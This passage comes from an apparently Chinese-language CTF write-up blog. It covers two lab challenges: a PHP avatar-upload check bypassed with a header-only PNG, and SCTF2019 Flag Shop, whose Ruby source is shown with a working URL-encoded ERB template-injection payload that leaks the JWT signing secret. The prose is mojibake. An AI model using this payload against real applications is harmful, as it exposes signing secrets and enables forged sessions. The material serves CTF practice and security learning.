</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;config.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;lib/util.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;lib/session.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$session</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SecureClientSession</span><span class="p">(</span><span class="nx">CLIENT_SESSION_ID</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check whether file is uploaded
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;No file was uploaded.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256000</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded file is too large.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$finfo</span> <span class="o">=</span> <span class="nx">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$type</span> <span class="o">=</span> <span class="nx">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nx">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;image/png&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded file is not PNG format.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// check file width/height
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$size</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$size</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256</span> <span class="o">||</span> <span class="nv">$size</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Uploaded image is too large.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$size</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// I hope this never happens...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">error</span><span class="p">(</span><span class="s1">&#39;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#39;</span> <span class="o">.</span> <span class="nx">getenv</span><span class="p">(</span><span class="s1">&#39;FLAG1&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/code&gt;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ok
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filename</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;.png&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;avatar&#39;</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">flash</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="s1">&#39;Your avatar has been successfully updated!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œç”¨åˆ°finfo_fileæ£€æµ‹å›¾ç‰‡ç±»å‹ï¼Œç„¶ågetimagesizeåˆ¤æ–­æ–‡ä»¶åƒç´ å¤§å°ï¼Œå¹¶ä¸”å†è¿›è¡Œä¸€æ¬¡ç±»å‹åˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯ png ç±»å‹å°±ç»™å‡º flagï¼Œæˆ‘ä»¬ç›´æ¥010æ„é€ ä¸€ä¸ªåªæœ‰pngå¤´çš„å›¾ç‰‡,å»miscé¢˜é‡Œé¢æ‰¾ä¸€ä¸ªpngå›¾ç‰‡ï¼ŒæŠŠæ–‡ä»¶å¤´ä¸‹é¢å…¨åˆ äº†</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904.png"
	width="982"
	height="746"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904_hu18066822231927187810.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250424143945904_hu10792788343392870505.png 1024w"
	loading="lazy"
	
		alt="image-20250424143945904"
	
	
		class="gallery-image" 
		data-flex-grow="131"
		data-flex-basis="315px"
	
></p>
<h2 id="sctf2019flag-shop">[SCTF2019]Flag Shop
</h2><p>ç›®å½•æ‰«ærobots.txt</p>
<p>æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra/cookies&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;sinatra/json&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;jwt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;securerandom&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;erb&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="ss">:public_folder</span><span class="p">,</span> <span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="bp">__FILE__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/static&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">FLAGPRICE</span> <span class="o">=</span> <span class="mi">1000000000000000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">hex</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">configure</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">enable</span> <span class="ss">:logging</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">File</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="bp">__FILE__</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/../log/http.log&#39;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span><span class="o">.</span><span class="n">sync</span> <span class="o">=</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl">  <span class="n">use</span> <span class="no">Rack</span><span class="o">::</span><span class="no">CommonLogger</span><span class="p">,</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">redirect</span> <span class="s1">&#39;/shop&#39;</span><span class="p">,</span> <span class="mi">302</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/filebak&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">content_type</span> <span class="ss">:text</span>
</span></span><span class="line"><span class="cl">  <span class="n">erb</span> <span class="no">IO</span><span class="o">.</span><span class="n">binread</span> <span class="bp">__FILE__</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/api/auth&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="ss">uid</span><span class="p">:</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">uuid</span> <span class="p">,</span> <span class="ss">jkl</span><span class="p">:</span> <span class="mi">20</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">payload</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/api/info&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">json</span><span class="p">({</span><span class="ss">uid</span><span class="p">:</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;uid&#34;</span><span class="o">]</span><span class="p">,</span><span class="ss">jkl</span><span class="p">:</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/shop&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">erb</span> <span class="ss">:shop</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/work&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">  <span class="k">unless</span> <span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">nil?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/[0-9a-z]+/</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">puts</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:do</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> is working&#34;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">].</span><span class="n">to_i</span> <span class="o">+</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">random_number</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="no">ERB</span><span class="o">::</span><span class="kp">new</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> working successfully!&#39;)&lt;/script&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">post</span> <span class="s2">&#34;/shop&#34;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="n">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">decode</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="kp">true</span><span class="p">,</span> <span class="p">{</span> <span class="ss">algorithm</span><span class="p">:</span> <span class="s1">&#39;HS256&#39;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">auth</span><span class="o">[</span><span class="mi">0</span><span class="o">][</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">&lt;</span> <span class="no">FLAGPRICE</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="p">({</span><span class="ss">title</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">,</span><span class="ss">message</span><span class="p">:</span> <span class="s2">&#34;no enough jkl&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">&lt;&lt;</span> <span class="p">{</span><span class="ss">flag</span><span class="p">:</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="n">json</span><span class="p">({</span><span class="ss">title</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span><span class="ss">message</span><span class="p">:</span> <span class="s2">&#34;jkl is good thing&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">islogin</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">].</span><span class="n">nil?</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="n">redirect</span> <span class="n">to</span><span class="p">(</span><span class="s1">&#39;/shop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ERBæ¨¡æ¿æ³¨å…¥</p>
<p>æ³¨å…¥ç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:do</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> is working&#34;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span><span class="o">[</span><span class="s2">&#34;jkl&#34;</span><span class="o">].</span><span class="n">to_i</span> <span class="o">+</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">random_number</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">auth</span> <span class="o">=</span> <span class="no">JWT</span><span class="o">.</span><span class="n">encode</span> <span class="n">auth</span><span class="p">,</span><span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">]</span> <span class="p">,</span> <span class="s1">&#39;HS256&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cookies</span><span class="o">[</span><span class="ss">:auth</span><span class="o">]</span> <span class="o">=</span> <span class="n">auth</span>
</span></span><span class="line"><span class="cl">    <span class="no">ERB</span><span class="o">::</span><span class="kp">new</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:name</span><span class="o">][</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="o">]</span><span class="si">}</span><span class="s2"> working successfully!&#39;)&lt;/script&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">result</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>doå’Œnameè¦ç›¸åŒï¼Œæœ‰é•¿åº¦é™åˆ¶7å­—ç¬¦ï¼Œé™¤å»<code>&lt;%=%&gt;</code>åªå‰©ä¸‹ä¸¤ä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨rubyçš„é¢„å®šä¹‰å˜é‡<code>$'</code>,å¯ä»¥åŒ¹é…æœ€åä¸€æ¬¡åŒ¹é…å³è¾¹çš„å†…å®¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"> <span class="k">unless</span> <span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">nil?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;SECRET&#34;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">#{</span><span class="n">params</span><span class="o">[</span><span class="ss">:SECRET</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/[0-9a-z]+/</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">puts</span> <span class="no">ENV</span><span class="o">[</span><span class="s2">&#34;FLAG&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">end</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¿˜æœ‰æ­£åˆ™åŒ¹é…ï¼Œéœ€è¦æœ‰SECRETå‚æ•°ä¸”ä¸ºfalse,<code>$'</code>å°±èƒ½è·å–secret</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%=$&#39;%&gt;
</span></span><span class="line"><span class="cl">urlç¼–ç ä¸€ä¸‹ï¼š%3C%25%3D%24%27%25%3E
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”šè‡³å¯ä»¥ä¸ä¼ SECRETå‚æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/work?name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·å–åˆ°secretå€¼</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367.png"
	width="1847"
	height="638"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367_hu16146000464038398674.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165429367_hu4458420793493097326.png 1024w"
	loading="lazy"
	
		alt="image-20250426165429367"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="694px"
	
></p>
